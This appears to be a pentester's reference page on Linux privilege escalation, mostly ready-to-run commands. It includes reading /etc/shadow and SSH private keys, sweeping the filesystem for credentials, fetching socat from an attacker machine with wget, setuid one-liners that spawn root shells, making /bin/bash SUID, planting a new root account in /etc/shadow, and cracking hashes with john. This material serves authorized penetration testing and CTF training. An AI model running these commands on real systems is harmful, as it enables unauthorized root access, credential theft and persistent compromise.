---
title: Linux Privilege Escalation
description: Privilege Escalation (PrivEsc) is the act of exploiting a bug, a design flaw, or a configuration oversight in an operating system or software application to gain elevated access to resources that are normally protected from an application or user. Once you have root privileges on Linux, you can get sensitive information in the system.
tags:
    - Privilege Escalation
    - Remote Code Execution
refs:
    - https://book.hacktricks.xyz/linux-hardening/privilege-escalation
date: 2023-01-23
draft: false
---

## Investigation

There are some tools for investigating automatically.

- **[LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)**

- **[Linux Exploit Suggester](https://github.com/mzet-/linux-exploit-suggester)**

- **[Linux Smart Enumeration](https://github.com/diego-treitos/linux-smart-enumeration)**

### OS Information

```sh
hostname
# Alias
hostname -a
# DNS
hostname -d
# IP address for the host name
hostname -i
# All IP address for the host
hostname -I

uname -a
# Kernel version
uname -v
# OS
uname -o

# Current user
whoami
id
groups

# Environments
env
echo $PATH

# Positional arguments
echo $0
echo $1
echo $2
```

### Interesting Information

```sh
# Web server - Apache
cat /var/log/apache2/access.log

# Web server - Nginx
cat /etc/nginx/conf.d/.htpasswd

# Bash Files
cat .bashrc
cat .bash_history
cat .bash_profile
cat .profile
cat /var/log/bash.log

# Cron jobs
cat /etc/cron*
cat /etc/crontab
cat /etc/cron.d/*
cat /etc/cron.daily/*
cat /etc/cron.hourly/*
cat /etc/cron.monthly/*
cat /etc/cron.weekly/*
cat /var/spool/cron/*
cat /var/spool/cron/crontabs/*
# List all cron jobs
crontab -l
crontab -l -u username

# Hosts
cat /etc/hosts
# LDAP config
cat /etc/ldap/ldap.conf
# Messages
cat /etc/issue
cat /etc/motd

# MySQL
cat /etc/my.cnf

# Nameserver
cat /etc/resolv.conf
# NFS settings
cat /etc/exports
# Os kernel version
cat /proc/version
cat /etc/*release
# PAM
cat /etc/pam.d/passwd
# Sudo config
cat /etc/sudoers
cat /etc/sudoers.d/usersgroup
# SSH config
cat /etc/ssh/ssh_config
cat /etc/ssh/sshd_config
# Users and passwords
cat /etc/passwd
cat /etc/shadow
# List of all groups on the system
cat /etc/group

# Xpad (sensitive information e.g. user password)
cat .config/xpad/*

# SSH keys
ls -la /home /root /etc/ssh /home/*/.ssh/; locate id_rsa; locate id_dsa; find / -name id_rsa 2> /dev/null; find / -name id_dsa 2> /dev/null; find / -name authorized_keys 2> /dev/null; cat /home/*/.ssh/id_rsa; cat /home/*/.ssh/id_dsa

# Root folder of web server
ls /var/www/

# Sometimes, we find something...
ls -al /opt
```

### Open Ports

```sh
# -p: display PID/Program name for sockets
# -u: udp
# -n: don't resolve names
# -t: tcp
# -a: display all sockets
netstat -punta

# -n: don't resolve service names
# -t: show only TCP sockets
# -p: show process using socket
# -u: show only UDP sockets
ss -ntpu
```

To find listening ports, add **"-l"** flag.

```sh
# -l: show listening sockets
ss -ltp
```

- **Access open ports that cannot be accessed from outside**

    If we discover a listen port that cannot be accessed externally as below, we can access this port by port forwarding.

    ```txt
    tcp  0  0  127.0.0.1:8080  0.0.0.0:*  LISTEN  -                   
    ```

    There are various methods to do that.

    - **Method 1. Using Socat**

        In remote machine,  download the socat and run it.

        ```sh
        # we need to download the socat binary file from local machine
        wget http://<local-ip>:<local-port>/socat
        chmod +x socat
        socat tcp-listen:8090,fork,reuseaddr tcp:localhost:8080
        ```

    - **Method 2. Using SSH Tunnel (SSH credential required)**

        In local machine, run the ‘ssh -L’.

        ```sh
        ssh -L 8090:localhost:8080 remote-user@<remote-ip>
        ```

    Now we can access to **http://\<remote-ip\>:8090/** in local machine and actually can get the content of **http://\<remote-ip\>:8080/**.

### Process Monitors

```sh
# List all processes
lsof
# Select IPv[46] files
lsof -i
# Select IPv[46] files against specific port
lsof -i:53
lsof -i:80
# Select IPv[46] files against specific port (no port names)
lsof -i:53 -P
lsof -i:80 -P
# Specify user
lsof -u username


# Display the currently-running processes.
ps
ps aux
ps aux | grep ping
# If the right side of the result is cut off, pip with cat command.
ps aux | cat
ps aux | cat | grep ping
```

By using **[pspy](https://github.com/DominicBreuker/pspy)**, you can fetch processes without root privileges.

```sh
./pspy64

# -p: print commands to stdout
# -f: print file system events to stdout
# -i: interval in milliseconds
./pspy64 -pf -i 1000
```

If the process (like ping) is running as root, you may be able to capture the interesting information using tcpdump.

```sh
# -i lo: specify interface (lo: loopback address, localhost)
# -A: print each packet in ASCII
tcpdump -i lo -A
```

### Sensitive Information with Given Keywords

The **"find"** command searches files in the real system.

```sh
find / -name "*.txt" 2>/dev/null
find /opt -name "*.txt" 2>/dev/null
find / -name "authorized_keys" 2>/dev/null
find / -name "users" 2>/dev/null
find / -name "*user*" 2>/dev/null
find / -name "secret.key" -or -name "secret" 2>/dev/null
find / -name "credential*.txt" 2>/dev/null
find / -name "*secret*" -or -name "*credential*" 2>/dev/null
find / -name "*root*" -or -name "*password*" 2>/dev/null
find / -name "*.key" -or -name "*.db" 2>/dev/null
find / -name "*data*" 2>/dev/null
find / -name "*flag*" 2>/dev/null

# Backup files may contain sensitive information
find / -name "*backup*" 2>/dev/null

# Backup files for /etc/shadow.
# ex. /var/shadow.bak
find / -name *shadow* 2>/dev/null
```

If you want to find more faster, use **"locate"** command.  
It searches from the database on the system. It's faster than "find" but the found information is older.

```sh
locate data
locate flag
locate flag*.txt
locate *flag*
locate password
locate *password*
locate *save*
locate *save.txt
locate user.txt
locate user*
locate *user*
locate root.txt
locate *root*
locate .db
locate .txt
```

### SUID (Set User ID)

It allows users to run an executable as root privilege.

```sh
# Option 1
find / -type f -perm -04000 2>/dev/null
# Option 2
find / -type f -perm -u=s 2>/dev/null
# Option 3
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```

If you'll get some SUID files, research the information of them using **[GTFOBins](https://gtfobins.github.io/)**.

- **Find**

    If the "find" command is set as SUID, you can execute some commands as root privileges.

    ```sh
    find ./ -exec "whoami" \;
    find /etc/shadow -exec cat {} \;
    find /root -exec ls -al {} \;
    ```

- **Cputils**

    If the "cputils" is set as SUID, you can copy the sensitive file to another one. 

    ```sh
    cputils

    Enter the name of source file: /home/<user>/.ssh/id_rsa
    Enter the name of target file: /tmp/id_rsa
    ```

### Writable Directories

```sh
find / -writable 2>/dev/null | cut -d "/" -f 2,3 | sort -u
```

### Capabilities

To find files that are set capabilities.

```sh
getcap -r / 2>/dev/null
```

If you got the capabilities of "cap_setuid" from the output like the following, you may be able to get the root privileges.

```sh
# Perl (ex. /usr/bin/perl = cap_setuid+ep)
perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'

# PHP
php -r "posix_setuid(0); system('$CMD');"

# Python (ex. /usr/bin/python = cap_setuid+ep)
python -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

- **Set Capabilities**

    ```sh
    setcap cap_setuid+ep /path/to/binary
    ```

    If you found the **setcap** with **SUID**, you can manipulate commands like Python.

    ```sh
    cp /usr/bin/python3 /home/<current-user>/python3
    setcap cap_setuid+ep /home/<current-user>/python3
    ```

    Then get a root shell.

    ```sh
    /home/<current-user>/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
    ```

### Sensitive Contents in Files

```sh
# -r: recursive
# -n: line number
# -i: ignore case
grep -rni root ./
grep -rni password ./
grep -rni passwd ./
grep -rni db_password ./
grep -rni db_passwd ./

# -e: OR Searching
grep -re admin -re root -re credential -re password ./
grep -re secret -re key ./

# -v: Exclude
grep -rni password -v node_modules ./

# -E: regex
grep -riE 'flag{.*}' ./

# IP Address Searching
grep -rE -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" ./

# -h: no output filenames
grep -h root ./
```

### Disks (Drives)

List disks information on the target system.

```bash
# List information about block drives
lsblk

# The result
NAME    MAJ:MIN RM SIZE RO TYPE MOUNTPOINT
xvda    202:0    0  40G  0 disk 
└─xvda1 202:1    0  40G  0 part /etc/hosts
```

If we find the drives, we can mount it.

```bash
mkdir -p /mnt/tmp
mount /dev/xvda1 /mnt/tmp
```

### Cracking User Passwords

If we can access **/etc/passwd** and **/etc/shadow**, crack users password using **unshadow**.

1. **Copy Files**

    ```sh
    cp /etc/passwd ./passwd.txt
    cp /etc/shadow ./shadow.txt
    ```

2. **Combines Two Files**

    ```sh
    unshadow passwd.txt shadow.txt > passwords.txt
    ```

3. **Crack Passwords**

    ```sh
    john --wordlist=wordlist.txt passwords.txt
    ```

<br />

## Execute Commands as Root Privilege

### Change Shebang in Shell Script

Add "-p" option at the first line to execute the script as root privilege.

```sh
#!/bin/bash -p
whoami
```

### Use the Set User ID (SUID)

If you can change permission of the **/bin/bash** , add **SUID** to the file.

```sh
chmod 4755 /bin/bash
```

Then you execute it as root privilege by adding "-p" option.  
You'll be able to pwn the target shell.

```sh
user@machine:~/$ /bin/bash -p
root@machine:~/$ whoami
root
```

### Doas Command

**doas** executes commands as another user. **"doas.conf"** is interesting to privilege escalation.  
First of all, search location of doas.conf.

```sh
find / -type f -name "doas.conf" 2>/dev/null
```

Next check the configuration.

```sh
doas -C /path/to/doas.conf
doas -C /etc/doas.conf
# or
cat /etc/doas.conf
```

Execute doas as below.

```sh
doas -u root <command> <arg>
```

<br />

## Update Sensitive Information

1. **Change Password of Current User**

    You need to know the current user's password.

    ```sh
    echo -n '<current-password>\n<new-password>\n<new-password>' | passwd
    ```

2. **Add Another Root User to /etc/shadow**

    1. **Generate New Password**

        ```sh
        # -6: SHA512
        openssl passwd -6 -salt salt password
        ```

        Copy the output hash.

    2. **Add New Line to /etc/shadow in Target Machine**

        You need to do as root privileges.

        ```sh
        echo '<new-user-name>:<generated-password-hash>:19115:0:99999:7:::' >> /etc/shadow
        ```

    3. **Switch to New User**

        To confirm, switch to generated new user.

        ```sh
        su <new-user>
        ```

<br />

## Display the Content of Files You Don't Have Permissions

Using **"more"** command.

1. **Make the Terminal's Window Size Smaller**

2. **Run "more" Command**

    The text like "--More--(60%)" will be appeared.

3. **Press 'v' on Keyboard to Enter Vim Mode**

4. **Enter ':e ~/somefile'**

<br />

## Snapd Vulnerabilities

- **Version < 2.37 Privilege Escalation**

    - **[CVE-2019-7304](https://www.exploit-db.com/exploits/46361)**


<br />

## Password Guessing from Old One

```sh
password2021 -> password2022, password2023
april123 -> may123, june123
apple -> banana, orange
```
